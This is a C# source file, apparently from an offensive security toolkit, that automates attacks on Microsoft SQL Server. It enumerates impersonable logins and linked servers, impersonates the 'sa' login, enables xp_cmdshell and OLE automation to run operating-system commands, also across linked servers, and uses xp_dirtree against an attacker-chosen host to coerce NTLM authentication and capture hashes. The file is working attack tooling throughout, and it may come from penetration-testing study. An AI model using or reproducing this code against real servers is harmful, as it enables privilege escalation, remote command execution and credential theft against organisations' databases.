using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;

namespace ExtensionToolkit.Func
{
    internal class MsSql
    {
        public static void Sql(string[] args)
        {
            var sqlHelpMap = new Dictionary<string, string>
            {
                { "check_login", "Args: <server> <database> (e.g master) ?<linkedServer>" },
                { "path_injection", "Args: <server> <database> <targetHost> ?<linkedServer>" },
                { "list_impersonable", "Args: <server> <database>" },
                { "list_links", "Args: <server> <database>" },
                { "impersonate_login", "Args: <server> <database> <targetUser>, ?<linkedServer>" },
                { "impersonate_user", "Args: <server> <database> <targetUser>, ?<linkedServer>" },
                { "exec_xpcmdshell", "Args: <server> <database> <command>" },
                { "exec_oamethod", "Args: <server> <database> <command>" }
            };
            // sql list_impersonable dc01.corp1.com master
            if (args.Length == 2 && args[1].Equals("help")){

                Console.WriteLine("Available operations and expected arguments:");
                foreach (var entry in sqlHelpMap)
                {
                    Console.WriteLine($"- {entry.Key}: {entry.Value}");
                }

                return;
            }
            else if (args.Length < 3)
            {
                Console.WriteLine("Mandatory args: operation, server, db");
                return;
            }

            bool isLinked = args[1].Equals("linked");

            string operation = isLinked ? args[2] : args[1];
            string sqlServer = isLinked ? args[3] : args[2];
            string db = isLinked ? args[4] : args[3];
            string linkedServer = isLinked? args[args.Length - 1] : null;

            SqlConnection con = AuthSql(sqlServer, db);

            var sqlMap = new Dictionary<string, Action>
            {
                { "check_login", () => {
                    CheckUserAndPriv(con, linkedServer);
                }},
                { "path_injection", () => {
                    string targetHost = isLinked ? args[5] : args[4];
                    if (targetHost == null)
                    {
                        Console.WriteLine("Error: targetHost is required for path_injection. Pass target IP Address instead of hostname");
                        return;
                    }
                    PathInjection(con, targetHost, linkedServer);
                }},
                { "list_impersonable", () => {
                    ListImpersonables(con, linkedServer);
                }},
                { "list_links", () => {
                    ListLinks(con, linkedServer);
                }},
                { "impersonate_login", () => {
                    string targetUser = isLinked ? args[4] : args[3];
                    if (targetUser == null)
                    {
                        Console.WriteLine("Error: target user is required for impersonation");
                        return;
                    }
                    ExecuteImpersonationLogin(con, targetUser, linkedServer);
                }},
                { "impersonate_user", () => {
                    string targetUser = isLinked ? args[4] : args[3];
                    if (targetUser == null)
                    {
                        Console.WriteLine("Error: target user is required for impersonation");
                        return;
                    }
                    ExecuteImpersonationUser(con, targetUser, linkedServer);
                }},
                { "exec_xpcmdshell", () => {
                    if (args.Length < (isLinked ? 7 : 5))
                    {
                        Console.WriteLine("Error: cmd needed");
                        return;
                    }

                    string cmd = string.Join(" ", args.Skip(isLinked ? 5 : 4).Take(isLinked ? args.Length - 6 : args.Length - 4));
                    Console.WriteLine($"cmd {cmd}");
                    Console.WriteLine($"server {linkedServer}");
                    ExecuteXpCmdshell(con, cmd, linkedServer);
                }},
                { "exec_oamethod", () => {
                    // Verifica se há argumentos suficientes
                    if (args.Length < (isLinked ? 7 : 5))
                    {
                        Console.WriteLine("Error: cmd needed");
                        return;
                    }

                    string cmd = string.Join(" ", args.Skip(isLinked ? 5 : 4).Take(isLinked ? args.Length - 6 : args.Length - 4));
                    ExecuteOaMethod(con, cmd, linkedServer); 
                }},
            };

            if (sqlMap.TryGetValue(operation, out Action action))
            {
                Console.WriteLine($"Executing operation: {operation}");
                try
                {
                    action();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Exception: {ex.Message}");
                }
            }
            else
            {
                Console.WriteLine($"Unknown operation: {operation}");
            }

            Console.WriteLine("closing connection");
            con.Close();
        }

        public static SqlConnection AuthSql(string sqlServer, string database)
        {
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine($"Auth success with Kerberos on {sqlServer}, {database}");

            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            return con;
        }

        public static void ExecuteImpersonationUser(SqlConnection con, string user, string linkedServer = null)
        {
            // Monta a query para executar a impersonação do usuário
            string executeAs = linkedServer != null
                ? $"EXEC {linkedServer}.msdb.dbo.sp_executesql N'EXECUTE AS USER = ''{user}'';'"
                : $"USE msdb; EXECUTE AS USER = '{user}';";

            // Executa a query
            ExecuteScalarQuery(con, executeAs);

            // Verifica as novas permissões após a impersonação
            Console.WriteLine($"New Privileges: ");
            CheckUserAndPriv(con, linkedServer);
        }

        public static void ExecuteImpersonationLogin(SqlConnection con, string user, string linkedServer = null)
        {
            // Monta a query para executar a impersonação do login
            string executeAs = linkedServer != null
                ? $"EXEC {linkedServer}.msdb.dbo.sp_executesql N'EXECUTE AS LOGIN = ''{user}'';'"
                : $"EXECUTE AS LOGIN = '{user}';";

            // Executa a query
            ExecuteScalarQuery(con, executeAs);

            // Verifica as novas permissões após a impersonação
            Console.Write($"New Privileges: ");
            CheckUserAndPriv(con, linkedServer);
        }

        public static void ExecuteXpCmdshell(SqlConnection con, string cmd, string linkedServer = null)
        {
            ExecuteImpersonationLogin(con, "sa", linkedServer);

            // Comandos para habilitar xp_cmdshell
            string enableXpcmd = linkedServer != null
                ? $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT {linkedServer};"
                : "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

            // Verifica se linkedServer está presente
            string execCmd = linkedServer != null
                ? $"EXEC ('EXEC xp_cmdshell ''{cmd}''') AT {linkedServer};"
                : $"EXEC xp_cmdshell '{cmd}'";

            // Executa o comando para habilitar xp_cmdshell
            Console.WriteLine($"Enabling xp_cmdshell...");
            ExecuteNonQuery(con, enableXpcmd);

            // Executa o comando principal
            Console.WriteLine($"Executing: {execCmd}");
            var result = ExecuteScalarQuery(con, execCmd);

            Console.WriteLine("Result of command is: " + result);
        }

        public static void ExecuteOaMethod(SqlConnection con, string cmd, string linkedServer = null)
        {
            ExecuteImpersonationLogin(con, "sa", linkedServer);

            string enableOle = linkedServer != null
                ? $"EXEC ('EXEC sp_configure ''Ole Automation Procedures'', 1; RECONFIGURE;') AT {linkedServer};"
                : "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";

            string execCmd = linkedServer != null
                ? $"EXEC {linkedServer}.master.dbo.sp_executesql N'DECLARE @myshell INT; EXEC sp_oacreate ''wscript.shell'', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''run'', null, ''cmd /c \"{cmd}\"'';'"
                : $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c \"{cmd}\"';";

            Console.WriteLine($"Enabling Ole Automation Procedures...");
            ExecuteScalarQuery(con, enableOle);

            Console.WriteLine($"Executing: {execCmd}");
            var result = ExecuteScalarQuery(con, execCmd);
            Console.WriteLine("Result of command is: " + result);
        }


        public static void ListImpersonables(SqlConnection con, string linkedServer = null)
        {
            string query = "SELECT DISTINCT b.name " +
                           "FROM sys.server_permissions a " +
                           "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id " +
                           "WHERE a.permission_name = 'IMPERSONATE';";

            if (!string.IsNullOrEmpty(linkedServer))
            {
                query = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT DISTINCT b.name " +
                         "FROM sys.server_permissions a " +
                         "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id " +
                         "WHERE a.permission_name = ''IMPERSONATE'';');";
            }

            Console.WriteLine($"Attempting to execute: {query}");

            // Usando ExecuteScalarQuery para retornar o valor
            var impersonable = ExecuteScalarQuery(con, query);
            if (impersonable != null)
            {
                Console.WriteLine($"Impersonable users: {impersonable}");
            }
            else
            {
                Console.WriteLine("No impersonable users found.");
            }
        }

        public static void ListLinks(SqlConnection con, string linkedServer = null)
        {
            string query;

            if (!string.IsNullOrEmpty(linkedServer))
            {
                query = $"EXEC ('EXEC sp_linkedservers') AT {linkedServer};";
            }
            else
            {
                query = $"EXEC sp_linkedservers;";
            }

            Console.WriteLine($"Attempting to execute: {query}");

            SqlCommand command = new SqlCommand(query, con);
            SqlDataReader reader = command.ExecuteReader();

            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server: " + reader[0]);
            }

            reader.Close();
        }

        // If the hostname is given as an IP address, Windows will automatically revert to NTLM authentication instead of Kerberos authentication, giving us the hash
        public static void PathInjection(SqlConnection con, string host, string linkedServer = null)
        {
            string query;

            if (!string.IsNullOrEmpty(linkedServer))
            {
                query = $"EXEC ('EXEC master..xp_dirtree \"\\\\{host}\\\\test\"') AT {linkedServer};";
            }
            else
            {
                query = $"EXEC master..xp_dirtree \"\\\\{host}\\\\test\";";
            }
            Console.WriteLine($"Attempting to execute: {query}");

            using (SqlCommand command = new SqlCommand(query, con))
            {
                command.CommandTimeout = 30;

                try
                {
                    using (SqlDataReader reader = command.ExecuteReader())
                    {
                    }
                }
                catch (SqlException ex)
                {
                    Console.WriteLine($"SQL Exception: {ex.Message}");
                }
            }
        }

        public static void CheckUserAndPriv(SqlConnection con, string linkedServer = null)
        {

            string queryLogin = "SELECT SYSTEM_USER;";
            string queryUser = "SELECT USER_NAME();";
            string queryPublicRole = "SELECT IS_SRVROLEMEMBER('public');";
            string querySysAdminRole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            string queryServerName = "SELECT @@SERVERNAME;";

            if (!string.IsNullOrEmpty(linkedServer))
            {
                queryLogin = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT SYSTEM_USER;')";
                queryUser = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT USER_NAME();')";
                queryPublicRole = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT IS_SRVROLEMEMBER(''public'');')";
                querySysAdminRole = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT IS_SRVROLEMEMBER(''sysadmin'');')";
                queryServerName = $"SELECT * FROM OPENQUERY({linkedServer}, 'SELECT @@SERVERNAME;')";
            }

            string login = ExecuteScalarQuery(con, queryLogin);
            string user = ExecuteScalarQuery(con, queryUser);
            int isPublic = int.Parse(ExecuteScalarQuery(con, queryPublicRole));
            int isAdmin = int.Parse(ExecuteScalarQuery(con, querySysAdminRole));
            string serverName = ExecuteScalarQuery(con, queryServerName);

            string publicRole = (isPublic == 1) ? "member of public role" : "not member of public role";
            string adminRole = (isAdmin == 1) ? "member of sysadmin role" : "not member of sysadmin role";

            Console.WriteLine($"SQL Server: {serverName}, Login: {login}, Mapped User: {user}, {publicRole}, {adminRole}");
        }

        private static string ExecuteScalarQuery(SqlConnection con, string query)
        {
            using (SqlCommand command = new SqlCommand(query, con))
            {
                command.CommandTimeout = 30; // Definindo tempo limite
                return command.ExecuteScalar()?.ToString(); // Usando ExecuteScalar para retornar um único valor
            }
        }

        private static void ExecuteNonQuery(SqlConnection con, string query)
        {
            using (SqlCommand command = new SqlCommand(query, con))
            {
                command.CommandTimeout = 30; // Definindo tempo limite
                command.ExecuteNonQuery(); // Executa a consulta sem retornar resultados
            }
        }
    }
}
